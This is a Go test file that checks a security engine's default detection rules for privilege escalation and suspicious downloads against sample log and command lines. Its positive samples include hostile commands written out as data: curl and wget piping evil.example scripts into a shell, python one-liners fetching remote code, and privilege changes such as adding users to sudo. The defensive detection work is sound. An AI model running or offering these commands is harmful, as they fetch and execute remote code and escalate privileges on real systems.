package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"testing"
)

func loadDefaultBundleRules(t *testing.T) map[string]compiledRuntimeRule {
	t.Helper()
	path := filepath.Join("..", "..", "rules", "security-engine", "default-bundle.json")
	payload, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read default bundle: %v", err)
	}
	var bundle compiledBundleFile
	if err := json.Unmarshal(payload, &bundle); err != nil {
		t.Fatalf("decode default bundle: %v", err)
	}
	out := map[string]compiledRuntimeRule{}
	for _, rule := range bundle.Rules {
		out[rule.ID] = rule
	}
	return out
}

func TestDefaultPrivilegeRuleRejectsRoutineSudo(t *testing.T) {
	rules := loadDefaultBundleRules(t)
	rule, ok := rules["log-privilege-escalation-default"]
	if !ok {
		t.Fatal("privilege rule missing from default bundle")
	}
	re, err := regexp.Compile(rule.Value)
	if err != nil {
		t.Fatalf("compile privilege rule: %v", err)
	}
	negative := []string{
		"pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)",
		"sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update",
		"sudo: bob : TTY=pts/1 ; PWD=/srv ; USER=root ; COMMAND=/bin/systemctl restart nginx",
	}
	for _, sample := range negative {
		if re.MatchString(sample) {
			t.Fatalf("routine sudo should not match: %s", sample)
		}
	}
	positive := []string{
		"useradd deploy",
		"usermod -aG sudo deploy",
		"groupadd ops",
		"passwd root",
		"visudo",
		"setcap cap_net_raw+ep /usr/bin/tool",
		"chmod 777 /var/www/html",
		"chown root /tmp/backdoor",
		"sudo: alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd bob",
	}
	for _, sample := range positive {
		if !re.MatchString(sample) {
			t.Fatalf("privilege change should match: %s", sample)
		}
	}
}

func TestDefaultDownloadRuleRejectsNormalDownloads(t *testing.T) {
	rules := loadDefaultBundleRules(t)
	rule, ok := rules["runtime-suspicious-download-default"]
	if !ok {
		t.Fatal("download rule missing from default bundle")
	}
	re, err := regexp.Compile(rule.Value)
	if err != nil {
		t.Fatalf("compile download rule: %v", err)
	}
	negative := []string{
		"curl https://example.com/release.tar.gz",
		"wget https://example.com/release.tar.gz",
		"curl -s https://api.example.com/health",
		"python3 app.py",
		"python3 -m pip install requests",
	}
	for _, sample := range negative {
		if re.MatchString(sample) {
			t.Fatalf("normal download should not match: %s", sample)
		}
	}
	positive := []string{
		"curl http://evil.example/x.sh | bash",
		"wget -q http://evil.example/x.sh | sh",
		"wget http://evil.example/x -O /tmp/x",
		"curl http://evil.example/x -O /dev/shm/x",
		`python3 -c "import urllib.request; urllib.request.urlopen('http://evil.example/x')"`,
		`python -c "import requests; requests.get('http://evil.example/x')"`,
	}
	for _, sample := range positive {
		if !re.MatchString(sample) {
			t.Fatalf("suspicious download should match: %s", sample)
		}
	}
}
